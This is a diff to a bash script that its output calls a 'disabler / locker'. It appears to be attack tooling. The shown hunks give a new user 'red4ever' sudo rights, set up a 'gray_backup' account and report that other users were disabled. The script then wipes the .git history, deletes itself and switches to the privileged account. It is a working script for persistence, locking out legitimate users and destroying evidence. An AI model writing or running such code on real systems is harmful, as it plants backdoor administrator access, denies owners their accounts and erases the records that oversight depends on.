@@ -1,5 +1,5 @@
 #!/bin/bash
-
+# == Author: Nia Poor ==
 
 # A function that creates a whitelist. Will ALWAYS include the user executing the script.
 function create_whitelist()
@@ -11,7 +11,6 @@ function create_whitelist()
     sudo chown -R red4ever:red4ever /home/red4ever
     # The new user should have sudo privileges
     sudo usermod -aG sudo red4ever
-    sudo su - red4ever
 
     sudo mkdir -p /home/gray_backup
     # Create a user with the above home directory and the shell /bin/bash
@@ -109,6 +108,10 @@ echo "Users disabled successfully."
 echo
 echo "NUKING DISABLER / LOCKER AND LOGS"
 
-sudo rm -rf disable_no_menu.sh
+# Clear git logs (not sure how well these commands to that)
 sudo rm -rf .git
 sudo git init
+# Delete the script
+sudo rm -rf disable_no_menu.sh
+# Switch user to red
+sudo su - red4ever
